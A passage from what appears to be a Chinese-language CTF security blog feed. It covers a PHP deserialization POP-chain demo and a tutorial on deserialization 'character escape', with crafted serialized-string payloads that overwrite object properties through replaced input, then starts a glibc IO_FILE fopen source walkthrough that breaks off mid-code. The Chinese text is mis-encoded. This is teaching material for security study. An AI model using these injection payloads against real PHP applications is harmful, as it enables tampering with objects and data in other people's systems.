class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> func();<span class="comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfuncç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                <span class="variable">$s1</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> string1();<span class="comment">//æŠŠ $mod1èµ‹å€¼ä¸ºstring1ç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1= <span class="keyword">new</span> GetFlag();<span class="comment">//æŠŠ $str1èµ‹å€¼ä¸ºGetFlagç±»å¯¹è±¡          </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> start_gg;<span class="comment">//æ„é€ start_ggç±»å¯¹è±¡$b</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>)).<span class="string">&quot;&lt;br /&gt;&quot;</span>;<span class="comment">//æ˜¾ç¤ºè¾“å‡ºurlç¼–ç åçš„åºåˆ—åŒ–å¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸å¤ªç†Ÿï¼Œä¹‹åå¤šç»ƒå‡ ä¸ªé¢˜å§ã€‚</p><h1 id="2-ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#2-ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="2.ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>2.ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h1><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼š</p><p>ä¸€å…±ä¸¤ç§æƒ…å†µï¼šä¸€ä¸ªæ˜¯æ›¿æ¢åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿ï¼Œå¦ä¸€ä¸ªå°±æ˜¯æ›¿æ¢ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜çŸ­ã€‚</p><p>æ­¤ç±»é¢˜ç›®çš„æœ¬è´¨å°±æ˜¯æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™ç§é¢˜ç›®æœ‰ä¸ªå…±åŒç‚¹ï¼š</p><ol><li> phpåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç»è¿‡äº†æ›¿æ¢æˆ–è€…ä¿®æ”¹ï¼Œå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–ã€‚</li><li> æ€»æ˜¯<strong>å…ˆè¿›è¡Œåºåˆ—åŒ–</strong>ï¼Œ<strong>å†è¿›è¡Œæ›¿æ¢ä¿®æ”¹æ“ä½œ</strong>ã€‚</li></ol><h2 id="ä¸€ã€æ›¿æ¢ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"><a href="#ä¸€ã€æ›¿æ¢ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿" class="headerlink" title="ä¸€ã€æ›¿æ¢ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"></a>ä¸€ã€æ›¿æ¢ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</h2><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$AA</span>);</span><br><span class="line"><span class="variable">$res</span>=filter(serialize(<span class="variable">$AA</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="variable">$c</span>=unserialize(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// out : O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯ä»¥<code>;&#125;</code>æ¥ç»“å°¾ï¼Œå‡è‹¥å°†è¿™ä¸ªåŠ å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼Œå°±ä¼šå¯¼è‡´åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æå‰é—­åˆç»“æŸï¼Œä¸¢å¼ƒæ‰åé¢çš„å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = unserialize(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå‡ºé”™ï¼ŒåŸå› æ˜¯å› ä¸ºä»–ä¼šæŠŠåŒå¼•å·å½“åšå­—ç¬¦ä¸²ï¼Œè€Œä¸‹ä¸€ä¸ªæ˜¯åˆ†å·ï¼Œæ²¡æœ‰é—­åˆå¯¼è‡´æŠ¥é”™ã€‚</p><p>å‡å¦‚è¯´ä¸Šé¢çš„ä»£ç ä¸­<code>$name = &#39;aaaabb&#39;</code>ï¼Œè¿™æ—¶ä¼šè¿›è¡Œæ›¿æ¢ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;aaaaccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>è€Œå†æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå‡ºé”™ï¼Œæœ«å°¾çš„cæ˜¯è¯»å–ä¸åˆ°çš„ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²çš„é€ƒé€¸ã€‚ä¹Ÿå°±æ˜¯è¯´æ¯å¤šåŠ ä¸€ä¸ªbbå°±ä¼šé€ƒé€¸ä¸€ä¸ªå­—ç¬¦ã€‚é‚£æˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç é•¿åº¦çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚</p><p>å‡è‹¥åœ¨nameå¤„å†™ä¸€äº›å…¶ä»–çš„ä¸œè¥¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="comment">//echo serialize($AA);</span></span><br><span class="line"><span class="comment">//echo &#x27;&lt;/br&gt;&#x27;;</span></span><br><span class="line"><span class="variable">$res</span>=filter(serialize(<span class="variable">$AA</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>=unserialize(<span class="variable">$res</span>);</span><br><span class="line">print_r(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">out:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">A Object ( [name] =&gt; &quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;&#125; [pass] =&gt; <span class="number">123456</span> )</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸Šé¢27çš„é‚£ä¸ªä½ç½®ï¼Œè¿˜æœ‰å°±æ˜¯å¯ä»¥çœ‹å‡ºpassä»ç„¶æ˜¯123456ã€‚</p><p>è¿™é‡Œä¸»è¦æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œçœ‹ä¸‹é¢çš„å†…å®¹ï¼ˆ<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>çš„é•¿åº¦ä¸º27ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">81</span>:<span class="string">&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A Object ( </span></span><br><span class="line"><span class="string">[name] =&gt; ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc </span></span><br><span class="line"><span class="string">[pass] =&gt; hacker )</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°passå·²ç»æ”¹ä¸ºäº†hackerï¼ŒæˆåŠŸé€ƒé€¸ã€‚</p><h2 id="äºŒã€æ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­"><a href="#äºŒã€æ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­" class="headerlink" title="äºŒã€æ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­"></a>äºŒã€æ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­</h2><p>testçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rep</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace( <span class="string">&#x27;/php|test/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>]; </span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;number&#x27;</span>] = <span class="string">&#x27;2020&#x27;</span>;</span><br><span class="line"><span class="variable">$temp</span> = str_rep(serialize(<span class="variable">$test</span>));</span><br><span class="line">printf(<span class="variable">$temp</span>);</span><br><span class="line"><span class="variable">$fake</span> = unserialize(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;name:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;sign:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;sign&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;number:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;number&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">output:(?name=whoami&amp;sign=hello)</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;</span><br><span class="line">name:whoami</span><br><span class="line">sign:hello</span><br><span class="line">number:<span class="number">2020</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨nameå’Œsigné—´æ¥ä¿®æ”¹numberçš„å€¼ï¼š</p><p>payload:<code>name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;eval&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2000&quot;</span>;&#125;<span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">name:&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;hello</span></span><br><span class="line"><span class="string">sign:eval</span></span><br><span class="line"><span class="string">number:2000</span></span><br></pre></td></tr></table></figure><p>å°†testå…¨éƒ¨æ›¿æ¢ä¸ºç©ºï¼Œè¿™æ ·å°±å¯¼è‡´åŸæ¥æ­£ç¡®çš„<code>&quot;;s:4:&quot;sign&quot;;s:54:&quot;hello</code>å˜ä¸ºäº†nameï¼Œè€Œåé¢æ„é€ çš„æ¶æ„å­—ç¬¦ä¸²è¾¾åˆ°äº†æ›¿æ¢çš„æ•ˆæœã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#1-ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;1.ååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;1.ååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;Demo:&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILEè°ƒè¯•+è¯¦è§£</title>
    <link href="http://example.com/2021/09/24/IO_FILE/"/>
    <id>http://example.com/2021/09/24/IO_FILE/</id>
    <published>2021-09-24T15:09:51.000Z</published>
    <updated>2021-09-25T15:29:04.501Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>å¼€å§‹å¹²__IO_FILEã€‚ä¼šä¾æ¬¡è°ƒfopen,fwrite,freadä¹‹ç±»çš„IOå‡½æ•°çš„æºç ã€‚</p><h1 id="IO-FILEä¹‹fopenè¯¦è§£"><a href="#IO-FILEä¹‹fopenè¯¦è§£" class="headerlink" title="IO_FILEä¹‹fopenè¯¦è§£"></a>IO_FILEä¹‹fopenè¯¦è§£</h1><h2 id="demoç¨‹åº"><a href="#demoç¨‹åº" class="headerlink" title="demoç¨‹åº"></a>demoç¨‹åº</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>è·Ÿè¿›å»ä¹‹åå¯ä»¥çœ‹åˆ°fopenå®é™…æ˜¯<code>_IO_new_fopen</code>å‡½æ•°ã€‚å®ƒè°ƒç”¨çš„æ˜¯<code>__fopen_internal</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /usr/src/glibc/glibc-2.23/libio/iofopen.c</span><br><span class="line">    91   return NULL;</span><br><span class="line">    92 &#125;</span><br><span class="line">    93 </span><br><span class="line">    94 _IO_FILE *</span><br><span class="line">    95 _IO_new_fopen (const char *filename, const char *mode)</span><br><span class="line"> â–º  96 &#123;</span><br><span class="line">    97   return __fopen_internal (filename, mode, 1);</span><br><span class="line">    98 &#125;</span><br><span class="line">    99 </span><br><span class="line">   100 #ifdef _LIBC</span><br><span class="line">   101 strong_alias (_IO_new_fopen, __new_fopen)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>__fopen_internal</code>çœ‹ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line">    <span class="comment">//step1:åˆ†é…å†…å­˜</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, 